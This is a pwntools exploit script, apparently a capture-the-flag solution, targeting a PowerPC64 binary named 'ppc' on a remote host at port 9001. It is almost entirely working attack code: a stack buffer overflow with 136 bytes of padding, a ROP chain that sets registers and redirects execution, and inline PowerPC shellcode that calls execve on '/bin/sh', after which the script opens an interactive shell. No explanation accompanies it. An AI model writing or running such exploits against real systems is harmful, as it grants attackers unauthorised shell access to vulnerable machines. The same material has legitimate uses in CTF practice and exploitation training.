#!/usr/bin/python
from pwn import *
import sys

config = {
	"elf" : "./ppc",
	"libc" : "",
	"HOST" : "stack.overflow.fail",
	"PORT" : 9001
}

def exploit(r):

	"""
	Magic address
	0x00000000100d4100 -> 0x00000040007ff820
	"""
	# rop chain
	rop = '\x00'*8
	rop+= 'A'*(136-8)
	rop+= p64(0xb19b00b135)*2 # top of stack atm
	rop+= p64(0x100019d0) # ip
	rop+= "A"*8
	rop+= p64(0x4141) # r26 => 
	rop+= p64(0x4142) # r27 => r5
	rop+= p64(0x4143) # r28 => r4
	rop+= p64(0x4144) # r29 => r3
	rop+= p64(0x00000000100d4100-8) # r30
	rop+= p64(0xb00b) # r31
	rop+= p64(0xb00b)*2
	rop+= p64(0x10001940) # ip

	# shellcode
	context.arch = "powerpc64"
	context.endian = "little"
	rop+= "\x00"*0x30
	rop+= "/bin/sh\x00"
	rop+= asm("""
		addi r3, r1, 0x48
		xor r4, r4, r4
		xor r5, r5, r5
		xor r6, r6, r6
		li r0, 0xb
		sc 0x0
	""")
	#rop+= "\x00\x00\x00\x48" # infinite loop
	print repr(rop)

	r.recvline(); r.recvline(); r.recvline();
	log.info("main : 0x{:x}".format(e.symbols["welcome"]))
	r.sendline(rop)

	r.interactive()
	return

if __name__ == "__main__":
	
	if "elf" in config.keys() and config["elf"]:
		e = ELF(config["elf"])
	
	if "libc" in config.keys() and config["libc"]:
		libc = ELF(config["libc"])

	if sys.argv[-1] == "remote":
		r = remote(config["HOST"], config["PORT"])
		exploit(r)
	else:
		if "libc" in dir():
			r = process(config["elf"], env={"LD_PRELOAD" : config["libc"]})
		else:
			r = process(config["elf"])
		print util.proc.pidof(r)

		if sys.argv[-1] == "debug":
			pause()
		exploit(r)
